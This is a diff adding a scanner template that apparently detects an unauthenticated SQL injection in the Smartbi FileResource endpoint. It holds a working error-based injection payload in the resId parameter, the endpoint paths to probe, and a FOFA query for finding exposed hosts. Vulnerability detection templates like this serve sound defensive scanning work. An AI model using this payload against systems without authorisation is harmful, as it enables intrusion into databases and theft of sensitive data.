@@ -1,0 +1,43 @@
+id: smartbi-unauthenticated-sqli
+
+info:
+  name: Smartbi FileResource 未授权 SQL 注入
+  author: xpoc
+  severity: high
+  description: |
+    Smartbi 商业智能平台 FileResource 接口 resId 参数存在未授权 SQL 注入，可获取数据库敏感信息。
+  reference:
+    - https://mp.weixin.qq.com/s/yeMhVYJks_wf6Po-sA6iOg
+  metadata:
+    max-request: 2
+    fofa-query: app="SMARTBI"
+  tags: smartbi,sqli
+
+variables:
+  num: '{{rand_base(5)}}'
+
+http:
+  - raw:
+      - |
+        POST {{path}} HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        op=OPEN&resId=LOGIN_BG_IMG%27%20AND%20extractvalue(1,concat(0,md5('{{num}}')))--+
+
+    payloads:
+      path:
+        - /vision/FileResource
+        - /smartbi/vision/FileResource
+
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '{{md5(num)}}'
+
+      - type: status
+        status:
+          - 200
